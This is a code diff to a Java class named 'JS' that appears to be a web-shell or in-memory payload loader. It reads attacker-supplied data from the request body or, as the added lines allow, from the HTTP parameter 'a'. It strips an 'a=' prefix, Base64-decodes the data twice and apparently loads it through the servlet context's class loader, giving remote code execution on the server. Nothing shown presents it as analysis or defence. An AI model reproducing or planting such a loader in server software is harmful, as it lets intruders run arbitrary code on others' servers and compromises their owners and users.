@@ -25,6 +25,12 @@ public class JS {
                 try {
                     ClassLoader loader = MyRequest.getServletContext(request).getClass().getClassLoader();
                     byte[] cc = r(in);
+                    if (cc.length == 0) {
+                        cc = MyRequest.getParameter(request,"a").getBytes(java.nio.charset.StandardCharsets.UTF_8);
+                    }
+                    if (cc.length == 0) {
+                        return;
+                    }
 
                     String c = new String(cc);
                     try {
@@ -33,17 +39,16 @@ public class JS {
                     if (c.startsWith("a=")){
                         c = c.substring(2);
                     }
-                    cc = c.getBytes(java.nio.charset.StandardCharsets.UTF_8);
                     try {
                         Class Base64 = loader.loadClass("sun.misc.BASE64Decoder");
                         Object Decoder = Base64.newInstance();
-                        cc=(byte[]) Decoder.getClass().getMethod("decodeBuffer", new Class[]{String.class}).invoke(Decoder, new Object[]{(new String(cc))});
+                        cc=(byte[]) Decoder.getClass().getMethod("decodeBuffer", new Class[]{String.class}).invoke(Decoder, new Object[]{(c)});
                         cc=(byte[]) Decoder.getClass().getMethod("decodeBuffer", new Class[]{String.class}).invoke(Decoder, new Object[]{new String(cc)});
                     } catch (Throwable ex)
                     {
                         Class Base64 = loader.loadClass("java.util.Base64");
                         Object Decoder = Base64.getDeclaredMethod("getDecoder",new Class[0]).invoke(null, new Object[0]);
-                        cc=(byte[])Decoder.getClass().getMethod("decode", new Class[]{String.class}).invoke(Decoder, new Object[]{new String(cc)});
+                        cc=(byte[])Decoder.getClass().getMethod("decode", new Class[]{String.class}).invoke(Decoder, new Object[]{c});
                         cc=(byte[])Decoder.getClass().getMethod("decode", new Class[]{String.class}).invoke(Decoder, new Object[]{new String(cc)});
                     }
 
